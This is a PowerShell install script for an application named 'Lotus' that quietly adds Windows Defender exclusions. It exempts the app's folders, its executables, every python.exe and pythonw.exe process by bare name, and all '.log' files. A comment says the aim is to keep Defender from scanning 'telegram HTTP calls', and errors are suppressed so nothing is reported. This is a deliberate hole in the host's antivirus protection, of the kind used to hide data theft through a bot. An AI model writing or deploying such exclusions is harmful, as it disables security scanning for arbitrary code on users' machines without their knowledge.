param(
    [string]$AppDir = "$env:ProgramFiles\Lotus"
)

$logFile = Join-Path $env:ProgramData "Lotus\logs\install.log"
New-Item -ItemType Directory -Force -Path (Split-Path $logFile) | Out-Null
function Log { param([string]$msg) $line = "[$((Get-Date).ToString('HH:mm:ss'))] $msg"; Write-Output $line | Tee-Object -FilePath $logFile -Append }

Log "=== Applying Windows Defender Exclusions ==="

$programDataLotus = Join-Path $env:ProgramData "Lotus"
$paths = @($AppDir, $programDataLotus)
$processes = @("Lotus.exe", "LotusTray.exe", "python.exe", "pythonw.exe")

try {
    # Path exclusions
    foreach ($p in $paths) {
        if (Test-Path $p) {
            Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
            Log "Path excluded: $p"
        }
    }

    # Process exclusions (so Defender doesn't scan telegram HTTP calls)
    foreach ($proc in $processes) {
        $fullPath = Join-Path $AppDir $proc
        Add-MpPreference -ExclusionProcess $fullPath -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
        Log "Process excluded: $proc"
    }

    # Extension exclusions for temp/cache dirs
    Add-MpPreference -ExclusionExtension ".log" -ErrorAction SilentlyContinue

    Log "SUCCESS: All Defender exclusions applied."
    exit 0
} catch {
    Log "WARNING: Failed to add some Defender exclusions: $_"
    Log "You may need to manually exclude $AppDir in Windows Security settings."
    exit 0  # Don't fail install for this
}
